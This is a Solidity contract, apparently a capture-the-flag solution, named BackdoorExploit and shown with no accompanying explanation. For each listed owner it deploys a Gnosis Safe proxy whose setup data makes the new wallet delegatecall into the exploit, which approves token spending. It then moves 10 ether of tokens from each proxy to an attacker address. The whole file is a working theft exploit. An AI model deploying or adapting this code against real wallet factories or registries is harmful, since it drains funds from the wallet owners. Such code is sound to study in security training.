pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract BackdoorExploit {
    function exploit(
        address[] calldata _owners,
        address _token,
        address _factory,
        address _singleton,
        IProxyCreationCallback callback,
        address attacker
    ) public {
        for (uint256 i = 0; i < _owners.length; i++) {
            address[] memory owner = new address[](1);
            owner[0] = _owners[i];
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owner,
                1,
                address(this),
                abi.encodeWithSignature(
                    "approveToken(address,address)",
                    _token,
                    address(this)
                ),
                address(0),
                address(0),
                0,
                address(0)
            );
            address proxy = address(GnosisSafeProxyFactory(_factory).createProxyWithCallback(
                _singleton,
                initializer,
                0,
                callback
            ));
            IERC20(_token).transferFrom(proxy, address(this), 10 ether);
            IERC20(_token).transfer(attacker, 10 ether);
        }
    }
    function approveToken(address _token, address spender) external {
        IERC20(_token).approve(spender, 10 ether);
    }
}